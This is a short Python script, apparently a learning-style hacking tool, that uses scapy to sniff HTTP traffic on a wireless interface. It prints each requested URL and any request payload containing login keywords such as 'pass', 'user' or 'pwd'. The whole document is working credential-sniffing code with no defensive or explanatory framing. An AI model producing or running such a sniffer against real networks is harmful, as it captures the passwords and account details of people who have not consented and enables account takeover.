#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def getURL(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        loginKeys = ["login", "pass", "usr", "user", "password", "account", "pwd", "pd", "Password", "UserName"]
        for key in loginKeys:
            if key in load:
                return load

def processNetPacketData(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getURL(packet)
        print("[+] Url Request Found -> " + url)

        login_INFO = getLoginInfo(packet)
        if login_INFO: #If statement is to make sure that the login_INFO only gets executed if its true on the getLoginInfo function
            print("[+] Potential Login Account --->>> " + login_INFO)

def sniff_NetPacketData(interface):
    print("[+] Sniffing... \n")
    scapy.sniff(iface=interface, store=False, prn=processNetPacketData)

sniff_NetPacketData("wlan0")